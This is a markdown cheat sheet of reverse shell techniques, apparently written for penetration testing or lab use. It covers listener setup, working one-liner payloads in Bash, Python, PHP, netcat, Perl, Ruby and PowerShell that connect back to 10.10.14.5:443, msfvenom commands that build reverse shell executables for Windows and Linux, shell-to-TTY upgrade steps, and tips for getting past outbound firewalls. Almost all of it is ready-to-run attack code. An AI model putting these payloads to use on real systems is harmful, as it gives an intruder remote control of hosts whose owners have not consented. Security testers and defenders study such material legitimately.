# Reverse shell cheat sheet

Set your listener first:
```bash
LHOST=10.10.14.5 ; LPORT=443
rlwrap nc -lvnp $LPORT        # rlwrap gives arrow keys / history
# or a smarter catcher:  pwncat-cs -lp $LPORT
```

## Payloads (swap 10.10.14.5/443)
```bash
# Bash
bash -i >& /dev/tcp/10.10.14.5/443 0>&1
# Bash (no /dev/tcp)
0<&196;exec 196<>/dev/tcp/10.10.14.5/443; sh <&196 >&196 2>&196

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("10.10.14.5",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# nc
nc -e /bin/sh 10.10.14.5 443
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f

# Perl / Ruby
perl -e 'use Socket;$i="10.10.14.5";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Windows
```powershell
# PowerShell one-liner
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}"
```
```bash
# Generate exe/dll/etc. with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o s.exe
msfvenom -p linux/x64/shell_reverse_tcp   LHOST=10.10.14.5 LPORT=443 -f elf -o s.elf
```

## Upgrade a dumb shell to a full TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then:  Ctrl-Z
stty raw -echo; fg
# then in the shell:
export TERM=xterm; stty rows 38 columns 116
```

## If outbound is filtered
- Try common allowed ports first: **443, 80, 53, 8080**.
- Fully firewalled? Use a **bind** shell or web shell instead.
- Tip: <https://www.revshells.com> generates any of these interactively.
